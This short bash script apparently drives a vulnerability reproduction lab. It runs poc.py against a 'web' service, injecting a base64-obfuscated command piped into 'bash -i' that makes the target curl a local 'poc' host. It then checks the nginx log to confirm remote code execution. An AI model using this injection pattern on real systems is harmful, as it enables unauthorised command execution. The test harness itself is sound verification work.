#!/bin/bash

./wait-for-it.sh web:8080 -- echo 2 > 2.txt
sleep 10

# start nginx
/etc/init.d/nginx start

pip3 install -r requirements_poc.txt -q
python3 poc.py web "bash -c {echo,Y3VybCBodHRwOi8vcG9jL2FzZGY=}|{base64,-d}|{bash,-i}" --register
sleep 10

# check via nginx access log
echo "nginx log :"
cat /var/log/nginx/access.log

echo "poc successÔºÅ"
# cleanup
rm -f attack.session